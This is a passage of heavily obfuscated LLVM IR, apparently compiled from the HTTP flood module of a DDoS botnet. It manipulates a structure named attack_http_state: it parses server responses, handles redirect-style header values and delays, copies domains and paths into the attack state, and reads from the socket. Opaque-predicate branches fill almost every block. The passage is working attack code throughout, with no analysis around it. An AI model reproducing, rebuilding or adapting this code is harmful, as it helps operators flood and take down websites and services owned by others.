  %2988 = load i32, i32* @x.19
  %2989 = load i32, i32* @y.20
  %2990 = sub i32 %2988, 1
  %2991 = mul i32 %2988, %2990
  %2992 = urem i32 %2991, 2
  %2993 = icmp eq i32 %2992, 0
  %2994 = icmp slt i32 %2989, 10
  %2995 = or i1 %2993, %2994
  br i1 %2995, label %originalBBpart2523, label %originalBB517alteredBB

originalBBpart2523:                               ; preds = %originalBB517
  br label %2996

; <label>:2996:                                   ; preds = %originalBBpart2523, %originalBBpart2515
  %2997 = load i8*, i8** %57, align 8
  %2998 = load i32, i32* %10, align 4
  %2999 = sext i32 %2998 to i64
  %3000 = getelementptr inbounds i8, i8* %2997, i64 %2999
  %3001 = load i8, i8* %3000, align 1
  %3002 = sext i8 %3001 to i32
  %3003 = icmp eq i32 %3002, 34
  br i1 %3003, label %3004, label %3036

; <label>:3004:                                   ; preds = %2996
  %3005 = load i32, i32* %10, align 4
  %3006 = add nsw i32 %3005, 1
  store i32 %3006, i32* %10, align 4
  %3007 = load i8*, i8** %57, align 8
  %3008 = load i32, i32* %10, align 4
  %3009 = sext i32 %3008 to i64
  %3010 = getelementptr inbounds i8, i8* %3007, i64 %3009
  %3011 = load i8*, i8** %57, align 8
  %3012 = load i32, i32* %10, align 4
  %3013 = sext i32 %3012 to i64
  %3014 = getelementptr inbounds i8, i8* %3011, i64 %3013
  %3015 = call i32 @util_strlen(i8* %3014)
  %3016 = sub nsw i32 %3015, 1
  %3017 = sext i32 %3016 to i64
  %3018 = getelementptr inbounds i8, i8* %3010, i64 %3017
  %3019 = load i8, i8* %3018, align 1
  %3020 = sext i8 %3019 to i32
  %3021 = icmp eq i32 %3020, 34
  br i1 %3021, label %3022, label %3035

; <label>:3022:                                   ; preds = %3004
  %3023 = load i8*, i8** %57, align 8
  %3024 = load i32, i32* %10, align 4
  %3025 = sext i32 %3024 to i64
  %3026 = getelementptr inbounds i8, i8* %3023, i64 %3025
  %3027 = load i8*, i8** %57, align 8
  %3028 = load i32, i32* %10, align 4
  %3029 = sext i32 %3028 to i64
  %3030 = getelementptr inbounds i8, i8* %3027, i64 %3029
  %3031 = call i32 @util_strlen(i8* %3030)
  %3032 = sub nsw i32 %3031, 1
  %3033 = sext i32 %3032 to i64
  %3034 = getelementptr inbounds i8, i8* %3026, i64 %3033
  store i8 0, i8* %3034, align 1
  br label %3035

; <label>:3035:                                   ; preds = %3022, %3004
  br label %3036

; <label>:3036:                                   ; preds = %3035, %2996
  %3037 = load i8*, i8** %57, align 8
  %3038 = call i32 @util_atoi(i8* %3037, i32 10)
  store i32 %3038, i32* %58, align 4
  br label %3039

; <label>:3039:                                   ; preds = %3070, %3036
  %3040 = load i32, i32* %58, align 4
  %3041 = icmp sgt i32 %3040, 0
  br i1 %3041, label %3042, label %3068

; <label>:3042:                                   ; preds = %3039
  %3043 = load i32, i32* @x.19
  %3044 = load i32, i32* @y.20
  %3045 = sub i32 %3043, 1
  %3046 = mul i32 %3043, %3045
  %3047 = urem i32 %3046, 2
  %3048 = icmp eq i32 %3047, 0
  %3049 = icmp slt i32 %3044, 10
  %3050 = or i1 %3048, %3049
  br i1 %3050, label %originalBB525, label %originalBB525alteredBB

originalBB525:                                    ; preds = %originalBB525alteredBB, %3042
  %3051 = load i32, i32* %58, align 4
  %3052 = icmp slt i32 %3051, 10
  %3053 = load i32, i32* @x.19
  %3054 = load i32, i32* @y.20
  %3055 = sub i32 %3053, 1
  %3056 = mul i32 %3053, %3055
  %3057 = urem i32 %3056, 2
  %3058 = icmp eq i32 %3057, 0
  %3059 = icmp slt i32 %3054, 10
  %3060 = or i1 %3058, %3059
  br i1 %3060, label %originalBBpart2527, label %originalBB525alteredBB

originalBBpart2527:                               ; preds = %originalBB525
  br i1 %3052, label %3061, label %3068

; <label>:3061:                                   ; preds = %originalBBpart2527
  %3062 = load i32, i32* %27, align 4
  %3063 = load i32, i32* %58, align 4
  %3064 = add i32 %3062, %3063
  %3065 = zext i32 %3064 to i64
  %3066 = call i64 @time(i64* null) #6
  %3067 = icmp sgt i64 %3065, %3066
  br label %3068

; <label>:3068:                                   ; preds = %3061, %originalBBpart2527, %3039
  %3069 = phi i1 [ false, %originalBBpart2527 ], [ false, %3039 ], [ %3067, %3061 ]
  br i1 %3069, label %3070, label %3072

; <label>:3070:                                   ; preds = %3068
  %3071 = call i32 @sleep(i32 1)
  br label %3039

; <label>:3072:                                   ; preds = %3068
  %3073 = load i32, i32* @x.19
  %3074 = load i32, i32* @y.20
  %3075 = sub i32 %3073, 1
  %3076 = mul i32 %3073, %3075
  %3077 = urem i32 %3076, 2
  %3078 = icmp eq i32 %3077, 0
  %3079 = icmp slt i32 %3074, 10
  %3080 = or i1 %3078, %3079
  br i1 %3080, label %originalBB529, label %originalBB529alteredBB

originalBB529:                                    ; preds = %originalBB529alteredBB, %3072
  %3081 = load i8*, i8** %57, align 8
  %3082 = load i32, i32* %10, align 4
  %3083 = sext i32 %3082 to i64
  %3084 = getelementptr inbounds i8, i8* %3081, i64 %3083
  store i8* %3084, i8** %57, align 8
  %3085 = load i8*, i8** %57, align 8
  %3086 = load i8*, i8** %57, align 8
  %3087 = call i32 @util_strlen(i8* %3086)
  %3088 = call i32 @util_stristr(i8* %3085, i32 %3087, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %3089 = icmp eq i32 %3088, 4
  %3090 = load i32, i32* @x.19
  %3091 = load i32, i32* @y.20
  %3092 = sub i32 %3090, 1
  %3093 = mul i32 %3090, %3092
  %3094 = urem i32 %3093, 2
  %3095 = icmp eq i32 %3094, 0
  %3096 = icmp slt i32 %3091, 10
  %3097 = or i1 %3095, %3096
  br i1 %3097, label %originalBBpart2531, label %originalBB529alteredBB

originalBBpart2531:                               ; preds = %originalBB529
  br i1 %3089, label %3098, label %3300

; <label>:3098:                                   ; preds = %originalBBpart2531
  %3099 = load i32, i32* @x.19
  %3100 = load i32, i32* @y.20
  %3101 = sub i32 %3099, 1
  %3102 = mul i32 %3099, %3101
  %3103 = urem i32 %3102, 2
  %3104 = icmp eq i32 %3103, 0
  %3105 = icmp slt i32 %3100, 10
  %3106 = or i1 %3104, %3105
  br i1 %3106, label %originalBB533, label %originalBB533alteredBB

originalBB533:                                    ; preds = %originalBB533alteredBB, %3098
  store i32 7, i32* %10, align 4
  %3107 = load i8*, i8** %57, align 8
  %3108 = getelementptr inbounds i8, i8* %3107, i64 4
  %3109 = load i8, i8* %3108, align 1
  %3110 = sext i8 %3109 to i32
  %3111 = icmp eq i32 %3110, 115
  %3112 = load i32, i32* @x.19
  %3113 = load i32, i32* @y.20
  %3114 = sub i32 %3112, 1
  %3115 = mul i32 %3112, %3114
  %3116 = urem i32 %3115, 2
  %3117 = icmp eq i32 %3116, 0
  %3118 = icmp slt i32 %3113, 10
  %3119 = or i1 %3117, %3118
  br i1 %3119, label %originalBBpart2535, label %originalBB533alteredBB

originalBBpart2535:                               ; preds = %originalBB533
  br i1 %3111, label %3120, label %3123

; <label>:3120:                                   ; preds = %originalBBpart2535
  %3121 = load i32, i32* %10, align 4
  %3122 = add nsw i32 %3121, 1
  store i32 %3122, i32* %10, align 4
  br label %3123

; <label>:3123:                                   ; preds = %3120, %originalBBpart2535
  %3124 = load i32, i32* @x.19
  %3125 = load i32, i32* @y.20
  %3126 = sub i32 %3124, 1
  %3127 = mul i32 %3124, %3126
  %3128 = urem i32 %3127, 2
  %3129 = icmp eq i32 %3128, 0
  %3130 = icmp slt i32 %3125, 10
  %3131 = or i1 %3129, %3130
  br i1 %3131, label %originalBB537, label %originalBB537alteredBB

originalBB537:                                    ; preds = %originalBB537alteredBB, %3123
  %3132 = load i8*, i8** %57, align 8
  %3133 = load i8*, i8** %57, align 8
  %3134 = load i32, i32* %10, align 4
  %3135 = sext i32 %3134 to i64
  %3136 = getelementptr inbounds i8, i8* %3133, i64 %3135
  %3137 = load i32, i32* %56, align 4
  %3138 = load i32, i32* %10, align 4
  %3139 = sub nsw i32 %3137, %3138
  %3140 = sext i32 %3139 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3132, i8* %3136, i64 %3140, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  %3141 = load i32, i32* @x.19
  %3142 = load i32, i32* @y.20
  %3143 = sub i32 %3141, 1
  %3144 = mul i32 %3141, %3143
  %3145 = urem i32 %3144, 2
  %3146 = icmp eq i32 %3145, 0
  %3147 = icmp slt i32 %3142, 10
  %3148 = or i1 %3146, %3147
  br i1 %3148, label %originalBBpart2545, label %originalBB537alteredBB

originalBBpart2545:                               ; preds = %originalBB537
  br label %3149

; <label>:3149:                                   ; preds = %3202, %originalBBpart2545
  %3150 = load i8*, i8** %57, align 8
  %3151 = load i32, i32* %10, align 4
  %3152 = sext i32 %3151 to i64
  %3153 = getelementptr inbounds i8, i8* %3150, i64 %3152
  %3154 = load i8, i8* %3153, align 1
  %3155 = sext i8 %3154 to i32
  %3156 = icmp ne i32 %3155, 0
  br i1 %3156, label %3157, label %3205

; <label>:3157:                                   ; preds = %3149
  %3158 = load i32, i32* @x.19
  %3159 = load i32, i32* @y.20
  %3160 = sub i32 %3158, 1
  %3161 = mul i32 %3158, %3160
  %3162 = urem i32 %3161, 2
  %3163 = icmp eq i32 %3162, 0
  %3164 = icmp slt i32 %3159, 10
  %3165 = or i1 %3163, %3164
  br i1 %3165, label %originalBB547, label %originalBB547alteredBB

originalBB547:                                    ; preds = %originalBB547alteredBB, %3157
  %3166 = load i8*, i8** %57, align 8
  %3167 = load i32, i32* %10, align 4
  %3168 = sext i32 %3167 to i64
  %3169 = getelementptr inbounds i8, i8* %3166, i64 %3168
  %3170 = load i8, i8* %3169, align 1
  %3171 = sext i8 %3170 to i32
  %3172 = icmp eq i32 %3171, 47
  %3173 = load i32, i32* @x.19
  %3174 = load i32, i32* @y.20
  %3175 = sub i32 %3173, 1
  %3176 = mul i32 %3173, %3175
  %3177 = urem i32 %3176, 2
  %3178 = icmp eq i32 %3177, 0
  %3179 = icmp slt i32 %3174, 10
  %3180 = or i1 %3178, %3179
  br i1 %3180, label %originalBBpart2549, label %originalBB547alteredBB

originalBBpart2549:                               ; preds = %originalBB547
  br i1 %3172, label %3181, label %3202

; <label>:3181:                                   ; preds = %originalBBpart2549
  %3182 = load i32, i32* @x.19
  %3183 = load i32, i32* @y.20
  %3184 = sub i32 %3182, 1
  %3185 = mul i32 %3182, %3184
  %3186 = urem i32 %3185, 2
  %3187 = icmp eq i32 %3186, 0
  %3188 = icmp slt i32 %3183, 10
  %3189 = or i1 %3187, %3188
  br i1 %3189, label %originalBB551, label %originalBB551alteredBB

originalBB551:                                    ; preds = %originalBB551alteredBB, %3181
  %3190 = load i8*, i8** %57, align 8
  %3191 = load i32, i32* %10, align 4
  %3192 = sext i32 %3191 to i64
  %3193 = getelementptr inbounds i8, i8* %3190, i64 %3192
  store i8 0, i8* %3193, align 1
  %3194 = load i32, i32* @x.19
  %3195 = load i32, i32* @y.20
  %3196 = sub i32 %3194, 1
  %3197 = mul i32 %3194, %3196
  %3198 = urem i32 %3197, 2
  %3199 = icmp eq i32 %3198, 0
  %3200 = icmp slt i32 %3195, 10
  %3201 = or i1 %3199, %3200
  br i1 %3201, label %originalBBpart2553, label %originalBB551alteredBB

originalBBpart2553:                               ; preds = %originalBB551
  br label %3205

; <label>:3202:                                   ; preds = %originalBBpart2549
  %3203 = load i32, i32* %10, align 4
  %3204 = add nsw i32 %3203, 1
  store i32 %3204, i32* %10, align 4
  br label %3149

; <label>:3205:                                   ; preds = %originalBBpart2553, %3149
  %3206 = load i32, i32* @x.19
  %3207 = load i32, i32* @y.20
  %3208 = sub i32 %3206, 1
  %3209 = mul i32 %3206, %3208
  %3210 = urem i32 %3209, 2
  %3211 = icmp eq i32 %3210, 0
  %3212 = icmp slt i32 %3207, 10
  %3213 = or i1 %3211, %3212
  br i1 %3213, label %originalBB555, label %originalBB555alteredBB

originalBB555:                                    ; preds = %originalBB555alteredBB, %3205
  %3214 = load i8*, i8** %57, align 8
  %3215 = call i32 @util_strlen(i8* %3214)
  %3216 = icmp sgt i32 %3215, 0
  %3217 = load i32, i32* @x.19
  %3218 = load i32, i32* @y.20
  %3219 = sub i32 %3217, 1
  %3220 = mul i32 %3217, %3219
  %3221 = urem i32 %3220, 2
  %3222 = icmp eq i32 %3221, 0
  %3223 = icmp slt i32 %3218, 10
  %3224 = or i1 %3222, %3223
  br i1 %3224, label %originalBBpart2557, label %originalBB555alteredBB

originalBBpart2557:                               ; preds = %originalBB555
  br i1 %3216, label %3225, label %3235

; <label>:3225:                                   ; preds = %originalBBpart2557
  %3226 = load i8*, i8** %57, align 8
  %3227 = call i32 @util_strlen(i8* %3226)
  %3228 = icmp slt i32 %3227, 128
  br i1 %3228, label %3229, label %3235

; <label>:3229:                                   ; preds = %3225
  %3230 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3230, i32 0, i32 7
  %3232 = getelementptr inbounds [129 x i8], [129 x i8]* %3231, i32 0, i32 0
  %3233 = load i8*, i8** %57, align 8
  %3234 = call i32 @util_strcpy(i8* %3232, i8* %3233)
  br label %3235

; <label>:3235:                                   ; preds = %3229, %3225, %originalBBpart2557
  %3236 = load i8*, i8** %57, align 8
  %3237 = load i32, i32* %10, align 4
  %3238 = add nsw i32 %3237, 1
  %3239 = sext i32 %3238 to i64
  %3240 = getelementptr inbounds i8, i8* %3236, i64 %3239
  %3241 = call i32 @util_strlen(i8* %3240)
  %3242 = icmp slt i32 %3241, 256
  br i1 %3242, label %3243, label %3299

; <label>:3243:                                   ; preds = %3235
  %3244 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3244, i32 0, i32 6
  %3246 = getelementptr inbounds [257 x i8], [257 x i8]* %3245, i32 0, i32 0
  %3247 = getelementptr inbounds i8, i8* %3246, i64 1
  call void @util_zero(i8* %3247, i32 255)
  %3248 = load i8*, i8** %57, align 8
  %3249 = load i32, i32* %10, align 4
  %3250 = add nsw i32 %3249, 1
  %3251 = sext i32 %3250 to i64
  %3252 = getelementptr inbounds i8, i8* %3248, i64 %3251
  %3253 = call i32 @util_strlen(i8* %3252)
  %3254 = icmp sgt i32 %3253, 0
  br i1 %3254, label %3255, label %3282

; <label>:3255:                                   ; preds = %3243
  %3256 = load i32, i32* @x.19
  %3257 = load i32, i32* @y.20
  %3258 = sub i32 %3256, 1
  %3259 = mul i32 %3256, %3258
  %3260 = urem i32 %3259, 2
  %3261 = icmp eq i32 %3260, 0
  %3262 = icmp slt i32 %3257, 10
  %3263 = or i1 %3261, %3262
  br i1 %3263, label %originalBB559, label %originalBB559alteredBB

originalBB559:                                    ; preds = %originalBB559alteredBB, %3255
  %3264 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3265 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3264, i32 0, i32 6
  %3266 = getelementptr inbounds [257 x i8], [257 x i8]* %3265, i32 0, i32 0
  %3267 = getelementptr inbounds i8, i8* %3266, i64 1
  %3268 = load i8*, i8** %57, align 8
  %3269 = load i32, i32* %10, align 4
  %3270 = add nsw i32 %3269, 1
  %3271 = sext i32 %3270 to i64
  %3272 = getelementptr inbounds i8, i8* %3268, i64 %3271
  %3273 = call i32 @util_strcpy(i8* %3267, i8* %3272)
  %3274 = load i32, i32* @x.19
  %3275 = load i32, i32* @y.20
  %3276 = sub i32 %3274, 1
  %3277 = mul i32 %3274, %3276
  %3278 = urem i32 %3277, 2
  %3279 = icmp eq i32 %3278, 0
  %3280 = icmp slt i32 %3275, 10
  %3281 = or i1 %3279, %3280
  br i1 %3281, label %originalBBpart2564, label %originalBB559alteredBB

originalBBpart2564:                               ; preds = %originalBB559
  br label %3282

; <label>:3282:                                   ; preds = %originalBBpart2564, %3243
  %3283 = load i32, i32* @x.19
  %3284 = load i32, i32* @y.20
  %3285 = sub i32 %3283, 1
  %3286 = mul i32 %3283, %3285
  %3287 = urem i32 %3286, 2
  %3288 = icmp eq i32 %3287, 0
  %3289 = icmp slt i32 %3284, 10
  %3290 = or i1 %3288, %3289
  br i1 %3290, label %originalBB566, label %originalBB566alteredBB

originalBB566:                                    ; preds = %originalBB566alteredBB, %3282
  %3291 = load i32, i32* @x.19
  %3292 = load i32, i32* @y.20
  %3293 = sub i32 %3291, 1
  %3294 = mul i32 %3291, %3293
  %3295 = urem i32 %3294, 2
  %3296 = icmp eq i32 %3295, 0
  %3297 = icmp slt i32 %3292, 10
  %3298 = or i1 %3296, %3297
  br i1 %3298, label %originalBBpart2568, label %originalBB566alteredBB

originalBBpart2568:                               ; preds = %originalBB566
  br label %3299

; <label>:3299:                                   ; preds = %originalBBpart2568, %3235
  br label %3388

; <label>:3300:                                   ; preds = %originalBBpart2531
  %3301 = load i32, i32* @x.19
  %3302 = load i32, i32* @y.20
  %3303 = sub i32 %3301, 1
  %3304 = mul i32 %3301, %3303
  %3305 = urem i32 %3304, 2
  %3306 = icmp eq i32 %3305, 0
  %3307 = icmp slt i32 %3302, 10
  %3308 = or i1 %3306, %3307
  br i1 %3308, label %originalBB570, label %originalBB570alteredBB

originalBB570:                                    ; preds = %originalBB570alteredBB, %3300
  %3309 = load i8*, i8** %57, align 8
  %3310 = getelementptr inbounds i8, i8* %3309, i64 0
  %3311 = load i8, i8* %3310, align 1
  %3312 = sext i8 %3311 to i32
  %3313 = icmp eq i32 %3312, 47
  %3314 = load i32, i32* @x.19
  %3315 = load i32, i32* @y.20
  %3316 = sub i32 %3314, 1
  %3317 = mul i32 %3314, %3316
  %3318 = urem i32 %3317, 2
  %3319 = icmp eq i32 %3318, 0
  %3320 = icmp slt i32 %3315, 10
  %3321 = or i1 %3319, %3320
  br i1 %3321, label %originalBBpart2572, label %originalBB570alteredBB

originalBBpart2572:                               ; preds = %originalBB570
  br i1 %3313, label %3322, label %3371

; <label>:3322:                                   ; preds = %originalBBpart2572
  %3323 = load i8*, i8** %57, align 8
  %3324 = load i32, i32* %10, align 4
  %3325 = add nsw i32 %3324, 1
  %3326 = sext i32 %3325 to i64
  %3327 = getelementptr inbounds i8, i8* %3323, i64 %3326
  %3328 = call i32 @util_strlen(i8* %3327)
  %3329 = icmp slt i32 %3328, 256
  br i1 %3329, label %3330, label %3370

; <label>:3330:                                   ; preds = %3322
  %3331 = load i32, i32* @x.19
  %3332 = load i32, i32* @y.20
  %3333 = sub i32 %3331, 1
  %3334 = mul i32 %3331, %3333
  %3335 = urem i32 %3334, 2
  %3336 = icmp eq i32 %3335, 0
  %3337 = icmp slt i32 %3332, 10
  %3338 = or i1 %3336, %3337
  br i1 %3338, label %originalBB574, label %originalBB574alteredBB

originalBB574:                                    ; preds = %originalBB574alteredBB, %3330
  %3339 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3339, i32 0, i32 6
  %3341 = getelementptr inbounds [257 x i8], [257 x i8]* %3340, i32 0, i32 0
  %3342 = getelementptr inbounds i8, i8* %3341, i64 1
  call void @util_zero(i8* %3342, i32 255)
  %3343 = load i8*, i8** %57, align 8
  %3344 = load i32, i32* %10, align 4
  %3345 = add nsw i32 %3344, 1
  %3346 = sext i32 %3345 to i64
  %3347 = getelementptr inbounds i8, i8* %3343, i64 %3346
  %3348 = call i32 @util_strlen(i8* %3347)
  %3349 = icmp sgt i32 %3348, 0
  %3350 = load i32, i32* @x.19
  %3351 = load i32, i32* @y.20
  %3352 = sub i32 %3350, 1
  %3353 = mul i32 %3350, %3352
  %3354 = urem i32 %3353, 2
  %3355 = icmp eq i32 %3354, 0
  %3356 = icmp slt i32 %3351, 10
  %3357 = or i1 %3355, %3356
  br i1 %3357, label %originalBBpart2582, label %originalBB574alteredBB

originalBBpart2582:                               ; preds = %originalBB574
  br i1 %3349, label %3358, label %3369

; <label>:3358:                                   ; preds = %originalBBpart2582
  %3359 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3359, i32 0, i32 6
  %3361 = getelementptr inbounds [257 x i8], [257 x i8]* %3360, i32 0, i32 0
  %3362 = getelementptr inbounds i8, i8* %3361, i64 1
  %3363 = load i8*, i8** %57, align 8
  %3364 = load i32, i32* %10, align 4
  %3365 = add nsw i32 %3364, 1
  %3366 = sext i32 %3365 to i64
  %3367 = getelementptr inbounds i8, i8* %3363, i64 %3366
  %3368 = call i32 @util_strcpy(i8* %3362, i8* %3367)
  br label %3369

; <label>:3369:                                   ; preds = %3358, %originalBBpart2582
  br label %3370

; <label>:3370:                                   ; preds = %3369, %3322
  br label %3371

; <label>:3371:                                   ; preds = %3370, %originalBBpart2572
  %3372 = load i32, i32* @x.19
  %3373 = load i32, i32* @y.20
  %3374 = sub i32 %3372, 1
  %3375 = mul i32 %3372, %3374
  %3376 = urem i32 %3375, 2
  %3377 = icmp eq i32 %3376, 0
  %3378 = icmp slt i32 %3373, 10
  %3379 = or i1 %3377, %3378
  br i1 %3379, label %originalBB584, label %originalBB584alteredBB

originalBB584:                                    ; preds = %originalBB584alteredBB, %3371
  %3380 = load i32, i32* @x.19
  %3381 = load i32, i32* @y.20
  %3382 = sub i32 %3380, 1
  %3383 = mul i32 %3380, %3382
  %3384 = urem i32 %3383, 2
  %3385 = icmp eq i32 %3384, 0
  %3386 = icmp slt i32 %3381, 10
  %3387 = or i1 %3385, %3386
  br i1 %3387, label %originalBBpart2586, label %originalBB584alteredBB

originalBBpart2586:                               ; preds = %originalBB584
  br label %3388

; <label>:3388:                                   ; preds = %originalBBpart2586, %3299
  %3389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3389, i32 0, i32 9
  %3391 = getelementptr inbounds [9 x i8], [9 x i8]* %3390, i32 0, i32 0
  %3392 = call i8* @strcpy(i8* %3391, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %3393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3393, i32 0, i32 1
  store i8 10, i8* %3394, align 4
  br label %4179

; <label>:3395:                                   ; preds = %2914
  br label %3396

; <label>:3396:                                   ; preds = %3395, %originalBBpart2495
  br label %3397

; <label>:3397:                                   ; preds = %3396, %2725
  %3398 = load i32, i32* @x.19
  %3399 = load i32, i32* @y.20
  %3400 = sub i32 %3398, 1
  %3401 = mul i32 %3398, %3400
  %3402 = urem i32 %3401, 2
  %3403 = icmp eq i32 %3402, 0
  %3404 = icmp slt i32 %3399, 10
  %3405 = or i1 %3403, %3404
  br i1 %3405, label %originalBB588, label %originalBB588alteredBB

originalBB588:                                    ; preds = %originalBB588alteredBB, %3397
  %3406 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3407 = load i32, i32* %12, align 4
  %3408 = call i32 @util_memsearch(i8* %3406, i32 %3407, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %3408, i32* %37, align 4
  %3409 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3409, i32 0, i32 9
  %3411 = getelementptr inbounds [9 x i8], [9 x i8]* %3410, i32 0, i32 0
  %3412 = call signext i8 @util_strcmp(i8* %3411, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %3413 = sext i8 %3412 to i32
  %3414 = icmp ne i32 %3413, 0
  %3415 = load i32, i32* @x.19
  %3416 = load i32, i32* @y.20
  %3417 = sub i32 %3415, 1
  %3418 = mul i32 %3415, %3417
  %3419 = urem i32 %3418, 2
  %3420 = icmp eq i32 %3419, 0
  %3421 = icmp slt i32 %3416, 10
  %3422 = or i1 %3420, %3421
  br i1 %3422, label %originalBBpart2590, label %originalBB588alteredBB

originalBBpart2590:                               ; preds = %originalBB588
  br i1 %3414, label %3430, label %3423

; <label>:3423:                                   ; preds = %originalBBpart2590
  %3424 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3424, i32 0, i32 9
  %3426 = getelementptr inbounds [9 x i8], [9 x i8]* %3425, i32 0, i32 0
  %3427 = call signext i8 @util_strcmp(i8* %3426, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %3428 = sext i8 %3427 to i32
  %3429 = icmp ne i32 %3428, 0
  br i1 %3429, label %3430, label %3433

; <label>:3430:                                   ; preds = %3423, %originalBBpart2590
  %3431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3431, i32 0, i32 1
  store i8 7, i8* %3432, align 4
  br label %3460

; <label>:3433:                                   ; preds = %3423
  %3434 = load i32, i32* %12, align 4
  %3435 = load i32, i32* %37, align 4
  %3436 = icmp sgt i32 %3434, %3435
  br i1 %3436, label %3437, label %3456

; <label>:3437:                                   ; preds = %3433
  %3438 = load i32, i32* @x.19
  %3439 = load i32, i32* @y.20
  %3440 = sub i32 %3438, 1
  %3441 = mul i32 %3438, %3440
  %3442 = urem i32 %3441, 2
  %3443 = icmp eq i32 %3442, 0
  %3444 = icmp slt i32 %3439, 10
  %3445 = or i1 %3443, %3444
  br i1 %3445, label %originalBB592, label %originalBB592alteredBB

originalBB592:                                    ; preds = %originalBB592alteredBB, %3437
  %3446 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3447 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3446, i32 0, i32 1
  store i8 10, i8* %3447, align 4
  %3448 = load i32, i32* @x.19
  %3449 = load i32, i32* @y.20
  %3450 = sub i32 %3448, 1
  %3451 = mul i32 %3448, %3450
  %3452 = urem i32 %3451, 2
  %3453 = icmp eq i32 %3452, 0
  %3454 = icmp slt i32 %3449, 10
  %3455 = or i1 %3453, %3454
  br i1 %3455, label %originalBBpart2594, label %originalBB592alteredBB

originalBBpart2594:                               ; preds = %originalBB592
  br label %3459

; <label>:3456:                                   ; preds = %3433
  %3457 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3458 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3457, i32 0, i32 1
  store i8 1, i8* %3458, align 4
  br label %3459

; <label>:3459:                                   ; preds = %3456, %originalBBpart2594
  br label %3460

; <label>:3460:                                   ; preds = %3459, %3430
  %3461 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3462 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3461, i32 0, i32 0
  %3463 = load i32, i32* %3462, align 4
  %3464 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3465 = load i32, i32* %37, align 4
  %3466 = sext i32 %3465 to i64
  %3467 = call i64 @recv(i32 %3463, i8* %3464, i64 %3466, i32 16384)
  %3468 = trunc i64 %3467 to i32
  store i32 %3468, i32* %12, align 4
  br label %4145

; <label>:3469:                                   ; preds = %1700
  %3470 = load i32, i32* @x.19
  %3471 = load i32, i32* @y.20
  %3472 = sub i32 %3470, 1
  %3473 = mul i32 %3470, %3472
  %3474 = urem i32 %3473, 2
  %3475 = icmp eq i32 %3474, 0
  %3476 = icmp slt i32 %3471, 10
  %3477 = or i1 %3475, %3476
  br i1 %3477, label %originalBB596, label %originalBB596alteredBB

originalBB596:                                    ; preds = %originalBB596alteredBB, %3469
  %3478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3478, i32 0, i32 1
  %3480 = load i8, i8* %3479, align 4
  %3481 = zext i8 %3480 to i32
  %3482 = icmp eq i32 %3481, 7
  %3483 = load i32, i32* @x.19
  %3484 = load i32, i32* @y.20
  %3485 = sub i32 %3483, 1
  %3486 = mul i32 %3483, %3485
  %3487 = urem i32 %3486, 2
  %3488 = icmp eq i32 %3487, 0
  %3489 = icmp slt i32 %3484, 10
  %3490 = or i1 %3488, %3489
  br i1 %3490, label %originalBBpart2598, label %originalBB596alteredBB

originalBBpart2598:                               ; preds = %originalBB596
  br i1 %3482, label %3491, label %4028

; <label>:3491:                                   ; preds = %originalBBpart2598
  br label %3492

; <label>:3492:                                   ; preds = %originalBBpart2671, %3491
  %3493 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3494 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3493, i32 0, i32 1
  %3495 = load i8, i8* %3494, align 4
  %3496 = zext i8 %3495 to i32
  %3497 = icmp ne i32 %3496, 7
  br i1 %3497, label %3498, label %3499

; <label>:3498:                                   ; preds = %3492
  br label %4027

; <label>:3499:                                   ; preds = %3492
  %3500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3500, i32 0, i32 17
  %3502 = load i32, i32* %3501, align 4
  %3503 = icmp eq i32 %3502, 1024
  br i1 %3503, label %3504, label %3516

; <label>:3504:                                   ; preds = %3499
  %3505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3505, i32 0, i32 18
  %3507 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3506, i32 0, i32 0
